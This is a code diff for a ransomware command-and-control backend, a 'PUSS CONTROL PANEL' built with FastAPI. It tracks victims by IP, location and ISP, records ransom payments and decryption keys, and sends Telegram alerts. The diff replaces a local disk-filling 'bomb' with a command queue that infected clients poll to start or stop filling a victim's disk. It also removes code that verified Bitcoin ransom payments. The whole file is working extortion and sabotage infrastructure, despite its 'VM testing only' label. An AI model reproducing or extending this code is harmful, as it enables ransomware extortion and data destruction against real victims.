@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSS CONTROL PANEL - Complete Backend with Electrum & Disk Bomb
+PUSS CONTROL PANEL - Complete Backend with Disk Bomb Control
 FOR VM TESTING ONLY
 """
 
@@ -21,11 +21,11 @@ import platform
 from datetime import datetime, timedelta
 from typing import Optional, Dict, Any, List
 from contextlib import asynccontextmanager
-from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
+from fastapi import FastAPI, Request, Response, HTTPException, status, WebSocket, WebSocketDisconnect, Depends
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBasic, HTTPBasicCredentials
-from pydantic import BaseModel, Field
+from pydantic import BaseModel
 import requests
 import uvicorn
 
@@ -44,9 +44,9 @@ except ImportError:
 class Config:
     OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
     ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
-    BTC_WALLET = os.environ.get('BTC_WALLET',)
+    BTC_WALLET = os.environ.get('BTC_WALLET')
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL',)
+    SERVER_URL = os.environ.get('SERVER_URL')
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
@@ -105,161 +105,19 @@ class TelegramService:
             msg = f"💰 PAYMENT RECEIVED\nID: {victim['id']}\nAmount: {victim.get('ransom','0.5')} BTC\nTX: {victim.get('tx','')[:16]}..."
             self.send(msg)
     
-    def notify_bomb(self, client_id: str, action: str) -> None:
+    def notify_bomb(self, client_id: str, action: str, size: float = 0) -> None:
         if self.enabled:
-            msg = f"💣 DISK BOMB {action.upper()}\nClient: {client_id}"
+            if action == "start":
+                msg = f"💣 BOMB STARTED\nClient: {client_id}"
+            elif action == "stop":
+                msg = f"🛑 BOMB STOPPED\nClient: {client_id}"
+            elif action == "progress":
+                msg = f"📊 BOMB PROGRESS\nClient: {client_id}\nSize: {size:.2f} GB"
+            else:
+                msg = f"💣 BOMB {action.upper()}\nClient: {client_id}"
             self.send(msg)
 
 telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
-
-# ============================================================================
-# ELECTRUM INTEGRATION (Backend payment verification)
-# ============================================================================
-
-class ElectrumVerifier:
-    """Verify Bitcoin payments using blockchain APIs"""
-    
-    def __init__(self):
-        self.apis = [
-            self._verify_blockstream,
-            self._verify_blockchair,
-            self._verify_blockcypher
-        ]
-    
-    def verify_payment(self, address: str, expected_amount: float) -> tuple:
-        """Verify payment using multiple APIs"""
-        for api in self.apis:
-            try:
-                result = api(address, expected_amount)
-                if result[0]:  # If payment found
-                    return result
-            except:
-                continue
-        return (False, 0.0, "")
-    
-    def _verify_blockstream(self, address: str, expected: float) -> tuple:
-        r = requests.get(f"https://blockstream.info/api/address/{address}", timeout=5)
-        if r.status_code == 200:
-            data = r.json()
-            funded = data.get('chain_stats', {}).get('funded_txo_sum', 0) / 100000000
-            return (funded >= expected, funded, "blockstream")
-        return (False, 0.0, "")
-    
-    def _verify_blockchair(self, address: str, expected: float) -> tuple:
-        r = requests.get(f"https://api.blockchair.com/bitcoin/dashboards/address/{address}", timeout=5)
-        if r.status_code == 200:
-            data = r.json()
-            if 'data' in data and address in data['data']:
-                balance = data['data'][address]['address']['balance'] / 100000000
-                return (balance >= expected, balance, "blockchair")
-        return (False, 0.0, "")
-    
-    def _verify_blockcypher(self, address: str, expected: float) -> tuple:
-        r = requests.get(f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance", timeout=5)
-        if r.status_code == 200:
-            data = r.json()
-            balance = data.get('balance', 0) / 100000000
-            return (balance >= expected, balance, "blockcypher")
-        return (False, 0.0, "")
-
-electrum = ElectrumVerifier()
-
-# ============================================================================
-# DISK BOMB MANAGER
-# ============================================================================
-
-class DiskBombManager:
-    def __init__(self):
-        self.active_bombs = {}
-        self.bomb_threads = {}
-        self.ws_connections = {}
-        logger.info("Disk Bomb Manager initialized")
-    
-    def start_bomb(self, client_id: str, filename: str = "explosion.dat") -> bool:
-        if client_id in self.active_bombs and self.active_bombs[client_id].get('running'):
-            return False
-        
-        self.active_bombs[client_id] = {
-            'running': True,
-            'filename': filename,
-            'start_time': datetime.now().isoformat(),
-            'bytes_written': 0,
-            'size_gb': 0,
-            'status': 'running'
-        }
-        
-        thread = threading.Thread(target=self._run_bomb, args=(client_id, filename))
-        thread.daemon = True
-        self.bomb_threads[client_id] = thread
-        thread.start()
-        
-        logger.info(f"Bomb started for {client_id}")
-        telegram.notify_bomb(client_id, "started")
-        return True
-    
-    def _run_bomb(self, client_id: str, filename: str):
-        try:
-            one_gb = 1073741824
-            chunk = 1024 * 1024  # 1MB
-            bytes_written = 0
-            
-            with open(filename, 'wb') as f:
-                while self.active_bombs[client_id].get('running'):
-                    # Write 1GB
-                    for _ in range(one_gb // chunk):
-                        if not self.active_bombs[client_id].get('running'):
-                            break
-                        f.write(os.urandom(chunk))
-                        bytes_written += chunk
-                        f.flush()
-                        os.fsync(f.fileno())
-                        
-                        size = bytes_written / one_gb
-                        self.active_bombs[client_id]['bytes_written'] = bytes_written
-                        self.active_bombs[client_id]['size_gb'] = size
-                        
-                        self._send_update(client_id, {
-                            'type': 'progress',
-                            'size_gb': size,
-                            'bytes': bytes_written
-                        })
-                    
-                    time.sleep(1)  # Wait 1 second between GB
-                    
-        except Exception as e:
-            logger.error(f"Bomb error for {client_id}: {e}")
-            self.active_bombs[client_id]['status'] = f'error: {e}'
-            self._send_update(client_id, {'type': 'error', 'error': str(e)})
-        finally:
-            self.active_bombs[client_id]['running'] = False
-            self.active_bombs[client_id]['status'] = 'stopped'
-    
-    def stop_bomb(self, client_id: str) -> bool:
-        if client_id in self.active_bombs:
-            self.active_bombs[client_id]['running'] = False
-            logger.info(f"Bomb stopped for {client_id}")
-            telegram.notify_bomb(client_id, "stopped")
-            return True
-        return False
-    
-    def get_status(self, client_id: str) -> Dict:
-        return self.active_bombs.get(client_id, {'running': False})
-    
-    def get_all(self) -> Dict:
-        return self.active_bombs
-    
-    def register_ws(self, client_id: str, websocket):
-        self.ws_connections[client_id] = websocket
-    
-    def _send_update(self, client_id: str, data: Dict):
-        if client_id in self.ws_connections:
-            try:
-                import asyncio
-                asyncio.create_task(self.ws_connections[client_id].send_json(data))
-            except:
-                pass
-
-bomb_manager = DiskBombManager()
 
 # ============================================================================
 # DATABASE
@@ -270,6 +128,7 @@ class Database:
         self.db_path = db_path
         self.victims: Dict[str, Dict] = {}
         self.logs: List[Dict] = []
+        self.bomb_commands: Dict[str, List[Dict]] = {}  # Queue commands for clients
         self.settings = {
             'ransom': Config.RANSOM_AMOUNT,
             'wallet': Config.BTC_WALLET,
@@ -286,6 +145,7 @@ class Database:
                     data = json.load(f)
                     self.victims = data.get('victims', {})
                     self.logs = data.get('logs', [])
+                    self.bomb_commands = data.get('bomb_commands', {})
                     self.settings.update(data.get('settings', {}))
         except Exception as e:
             logger.error(f"Load error: {e}")
@@ -296,6 +156,7 @@ class Database:
                 json.dump({
                     'victims': self.victims,
                     'logs': self.logs[-1000:],
+                    'bomb_commands': self.bomb_commands,
                     'settings': self.settings
                 }, f, indent=2)
         except Exception as e:
@@ -335,6 +196,8 @@ class Database:
             'paid_at': None,
             'tx': None,
             'last_seen': now.isoformat(),
+            'bomb_status': 'inactive',
+            'bomb_size': 0,
             'notes': ''
         }
         
@@ -369,6 +232,8 @@ class Database:
     def delete_victim(self, victim_id: str) -> bool:
         if victim_id in self.victims:
             del self.victims[victim_id]
+            if victim_id in self.bomb_commands:
+                del self.bomb_commands[victim_id]
             self._save()
             self.log('warning', f"Deleted: {victim_id}")
             return True
@@ -381,30 +246,53 @@ class Database:
         total = len(self.victims)
         paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
         unpaid = total - paid
+        active_bombs = sum(1 for v in self.victims.values() if v.get('bomb_status') == 'active')
         
-        # Calculate total BTC
         try:
             amount = float(self.settings['ransom'])
             total_btc = paid * amount
         except:
             total_btc = paid * 0.5
         
-        # Geographic distribution
-        countries = {}
-        for v in self.victims.values():
-            c = v.get('country', 'Unknown')
-            countries[c] = countries.get(c, 0) + 1
-        
         return {
             'total': total,
             'paid': paid,
             'unpaid': unpaid,
             'btc': f"{total_btc:.2f}",
-            'bombs': len(bomb_manager.get_all()),
-            'countries': countries,
-            'rate': round((paid/total*100) if total > 0 else 0, 1),
+            'bombs': active_bombs,
             'time': datetime.now().isoformat()
         }
+    
+    # ============================================================================
+    # BOMB COMMAND QUEUE (For client polling)
+    # ============================================================================
+    
+    def add_bomb_command(self, client_id: str, command: Dict):
+        """Add a command for a client to pick up"""
+        if client_id not in self.bomb_commands:
+            self.bomb_commands[client_id] = []
+        self.bomb_commands[client_id].append(command)
+        self._save()
+        logger.info(f"Bomb command added for {client_id}: {command}")
+    
+    def get_bomb_command(self, client_id: str) -> Optional[Dict]:
+        """Get and remove the next command for a client"""
+        if client_id in self.bomb_commands and self.bomb_commands[client_id]:
+            cmd = self.bomb_commands[client_id].pop(0)
+            self._save()
+            return cmd
+        return None
+    
+    def update_bomb_status(self, client_id: str, status: str, size: float = 0):
+        """Update bomb status for a victim"""
+        if client_id in self.victims:
+            self.victims[client_id]['bomb_status'] = status
+            self.victims[client_id]['bomb_size'] = size
+            self.victims[client_id]['last_seen'] = datetime.now().isoformat()
+            self._save()
+            
+            if status == 'active' and size > 0:
+                telegram.notify_bomb(client_id, "progress", size)
     
     def log(self, level: str, msg: str):
         entry = {
@@ -424,6 +312,8 @@ db = Database()
 # ============================================================================
 # API MODELS
 # ============================================================================
+
+from pydantic import BaseModel
 
 class VictimRegister(BaseModel):
     victim_id: str
@@ -451,6 +341,12 @@ class BombStart(BaseModel):
 
 class BombStop(BaseModel):
     client_id: str
+
+class BombUpdate(BaseModel):
+    client_id: str
+    size_gb: Optional[float] = 0
+    bytes: Optional[int] = 0
+    error: Optional[str] = None
 
 class OwnerLogin(BaseModel):
     password: str
@@ -497,21 +393,6 @@ app.add_middleware(
     allow_methods=["*"],
     allow_headers=["*"],
 )
-
-# ============================================================================
-# WEBSOCKET FOR REAL-TIME BOMB UPDATES
-# ============================================================================
-
-@app.websocket("/ws/{client_id}")
-async def websocket_endpoint(websocket: WebSocket, client_id: str):
-    await websocket.accept()
-    bomb_manager.register_ws(client_id, websocket)
-    try:
-        while True:
-            await websocket.receive_text()
-    except WebSocketDisconnect:
-        if client_id in bomb_manager.ws_connections:
-            del bomb_manager.ws_connections[client_id]
 
 # ============================================================================
 # HTML TEMPLATE - SCARY 2000s STYLE
@@ -669,6 +550,11 @@ INDEX_HTML = """
             font-weight: bold;
         }
         
+        .status-active {
+            color: #ffaa00;
+            font-weight: bold;
+        }
+        
         .progress {
             width: 100%;
             height: 25px;
@@ -754,7 +640,7 @@ INDEX_HTML = """
                     <div>
                         <button onclick="startBomb()">[ START BOMB ]</button>
                         <button class="danger" onclick="stopBomb()">[ STOP BOMB ]</button>
-                        <button onclick="checkBomb()">[ STATUS ]</button>
+                        <button onclick="checkBombStatus()">[ REFRESH ]</button>
                     </div>
                     <div id="bomb_status"></div>
                     <div class="progress" id="bomb_progress" style="display:none;">
@@ -789,7 +675,7 @@ INDEX_HTML = """
         <div class="panel">
             <h3>📊 ALL VICTIMS</h3>
             <table class="table" id="victims_table">
-                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>
+                <tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>BOMB</th><th>DEADLINE</th></tr>
             </table>
         </div>
         
@@ -804,8 +690,7 @@ INDEX_HTML = """
     </div>
 
     <script>
-        let ws = null;
-        let currentClient = null;
+        let currentBombClient = null;
         
         async function loadStats() {
             try {
@@ -825,15 +710,19 @@ INDEX_HTML = """
             try {
                 const r = await fetch('/api/victims');
                 const v = await r.json();
-                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>DEADLINE</th></tr>';
+                let html = '<tr><th>ID</th><th>FILES</th><th>LOCATION</th><th>IP</th><th>STATUS</th><th>BOMB</th><th>DEADLINE</th></tr>';
                 for (const [id, data] of Object.entries(v)) {
                     const deadline = new Date(data.deadline).toLocaleString();
+                    const bombStatus = data.bomb_status === 'active' ? 
+                        `<span class="status-active">ACTIVE ${data.bomb_size.toFixed(1)}GB</span>` : 
+                        'inactive';
                     html += `<tr>
                         <td>${id}</td>
                         <td>${data.files}</td>
                         <td>${data.city || '?'}, ${data.country || '?'}</td>
                         <td>${data.ip}</td>
                         <td class="status-${data.status}">${data.status}</td>
+                        <td>${bombStatus}</td>
                         <td>${deadline}</td>
                     </tr>`;
                 }
@@ -853,27 +742,13 @@ INDEX_HTML = """
             } catch(e) {}
         }
         
-        function connectWS(client) {
-            if (ws) ws.close();
-            currentClient = client;
-            const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            ws = new WebSocket(`${proto}//${window.location.host}/ws/${client}`);
-            ws.onmessage = (e) => {
-                const d = JSON.parse(e.data);
-                if (d.type === 'progress') {
-                    document.getElementById('bomb_progress').style.display = 'block';
-                    document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
-                    document.getElementById('bomb_status').innerHTML = 
-                        `<div>Size: ${d.size_gb.toFixed(2)} GB</div>`;
-                }
-            };
-        }
-        
         async function startBomb() {
             const client = document.getElementById('bomb_client').value;
             const file = document.getElementById('bomb_file').value;
             if (!client) return alert('Enter Client ID');
-            connectWS(client);
+            
+            currentBombClient = client;
+            
             const r = await fetch('/api/bomb/start', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -881,13 +756,17 @@ INDEX_HTML = """
             });
             const d = await r.json();
             if (d.success) {
-                alert('Bomb started');
-                checkBomb();
+                alert('Bomb command sent to client');
+                setTimeout(checkBombStatus, 2000);
+            } else {
+                alert('Failed to send command');
             }
         }
         
         async function stopBomb() {
             const client = document.getElementById('bomb_client').value;
+            if (!client) return alert('Enter Client ID');
+            
             const r = await fetch('/api/bomb/stop', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -895,24 +774,28 @@ INDEX_HTML = """
             });
             const d = await r.json();
             if (d.success) {
-                alert('Bomb stopped');
+                alert('Stop command sent to client');
                 document.getElementById('bomb_progress').style.display = 'none';
                 document.getElementById('bomb_status').innerHTML = '';
             }
         }
         
-        async function checkBomb() {
-            const client = document.getElementById('bomb_client').value;
-            const r = await fetch(`/api/bomb/status/${client}`);
-            const d = await r.json();
-            if (d.running) {
-                document.getElementById('bomb_status').innerHTML = 
-                    `<div>Running: ${d.size_gb.toFixed(2)} GB | File: ${d.filename}</div>`;
-                document.getElementById('bomb_progress').style.display = 'block';
-                document.getElementById('bomb_fill').style.width = `${Math.min(d.size_gb, 100)}%`;
-            } else {
-                document.getElementById('bomb_status').innerHTML = 'No active bomb';
-                document.getElementById('bomb_progress').style.display = 'none';
+        async function checkBombStatus() {
+            const client = document.getElementById('bomb_client').value || currentBombClient;
+            if (!client) return;
+            
+            const r = await fetch(`/api/victim/${client}`);
+            if (r.status === 200) {
+                const v = await r.json();
+                if (v.bomb_status === 'active') {
+                    document.getElementById('bomb_status').innerHTML = 
+                        `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
+                    document.getElementById('bomb_progress').style.display = 'block';
+                    document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
+                } else {
+                    document.getElementById('bomb_status').innerHTML = 'No active bomb';
+                    document.getElementById('bomb_progress').style.display = 'none';
+                }
             }
         }
         
@@ -928,6 +811,7 @@ INDEX_HTML = """
                     <b>IP:</b> ${v.ip}<br>
                     <b>ISP:</b> ${v.isp}<br>
                     <b>Status:</b> <span class="status-${v.status}">${v.status}</span><br>
+                    <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
                     <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
                     ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
                 `;
@@ -1048,69 +932,64 @@ async def delete_victim(vid: str):
     return {'success': success}
 
 # ============================================================================
-# BOMB API
+# BOMB API - Client Communication
 # ============================================================================
 
 @app.post('/api/bomb/start')
 async def bomb_start(bomb: BombStart):
-    success = bomb_manager.start_bomb(bomb.client_id, bomb.filename)
-    if success:
-        db.log('info', f"Bomb started: {bomb.client_id}")
-    return {'success': success}
+    """Send start command to client"""
+    db.add_bomb_command(bomb.client_id, {
+        'action': 'start',
+        'filename': bomb.filename,
+        'timestamp': datetime.now().isoformat()
+    })
+    db.update_bomb_status(bomb.client_id, 'pending')
+    db.log('info', f"Bomb start command sent to {bomb.client_id}")
+    telegram.notify_bomb(bomb.client_id, "start")
+    return {'success': True}
 
 @app.post('/api/bomb/stop')
 async def bomb_stop(bomb: BombStop):
-    success = bomb_manager.stop_bomb(bomb.client_id)
-    if success:
-        db.log('info', f"Bomb stopped: {bomb.client_id}")
-    return {'success': success}
+    """Send stop command to client"""
+    db.add_bomb_command(bomb.client_id, {
+        'action': 'stop',
+        'timestamp': datetime.now().isoformat()
+    })
+    db.log('info', f"Bomb stop command sent to {bomb.client_id}")
+    telegram.notify_bomb(bomb.client_id, "stop")
+    return {'success': True}
 
-@app.get('/api/bomb/status/{client_id}')
-async def bomb_status(client_id: str):
-    return bomb_manager.get_status(client_id)
+@app.get('/api/bomb/command/{client_id}')
+async def get_bomb_command(client_id: str):
+    """Client polls this endpoint for commands"""
+    cmd = db.get_bomb_command(client_id)
+    if cmd:
+        return cmd
+    return {'action': 'none'}
 
-@app.get('/api/bomb/list')
-async def bomb_list():
-    return bomb_manager.get_all()
-
-# ============================================================================
-# PAYMENT VERIFICATION API (Uses Electrum)
-# ============================================================================
-
-@app.post('/api/check-payment')
-async def check_payment(req: Request):
-    data = await req.json()
-    address = data.get('address')
-    amount = float(data.get('amount', 0.5))
-    
-    if not address:
-        return {'success': False, 'error': 'No address'}
-    
-    paid, balance, source = electrum.verify_payment(address, amount)
-    return {
-        'success': paid,
-        'paid': paid,
-        'balance': balance,
-        'source': source,
-        'amount': amount
-    }
+@app.post('/api/bomb/update')
+async def bomb_update(update: BombUpdate):
+    """Client reports bomb progress"""
+    if update.error:
+        db.update_bomb_status(update.client_id, 'error')
+        db.log('error', f"Bomb error for {update.client_id}: {update.error}")
+    else:
+        status = 'active' if update.size_gb > 0 else 'inactive'
+        db.update_bomb_status(update.client_id, status, update.size_gb or 0)
+        if update.size_gb and update.size_gb > 0:
+            db.log('info', f"Bomb progress for {update.client_id}: {update.size_gb:.2f} GB")
+            if int(update.size_gb) % 10 == 0:  # Notify every 10GB
+                telegram.notify_bomb(update.client_id, "progress", update.size_gb)
+    return {'success': True}
 
 # ============================================================================
-# OWNER API (Protected)
+# OWNER API
 # ============================================================================
 
 @app.post('/api/owner/login')
 async def owner_login(login: OwnerLogin):
     success = login.password == Config.OWNER_PASSWORD
     return {'success': success}
-
-@app.get('/api/owner/stats', dependencies=[Depends(verify_owner)])
-async def owner_stats():
-    return {
-        'victims': len(db.victims),
-        'bombs': len(bomb_manager.get_all()),
-        'logs': db.get_logs(50)
-    }
 
 # ============================================================================
 # HEALTH CHECK
@@ -1122,7 +1001,6 @@ async def health():
         'status': 'ok',
         'time': datetime.now().isoformat(),
         'victims': len(db.victims),
-        'bombs': len(bomb_manager.get_all()),
         'telegram': telegram.enabled,
         'version': '3.0.0'
     }
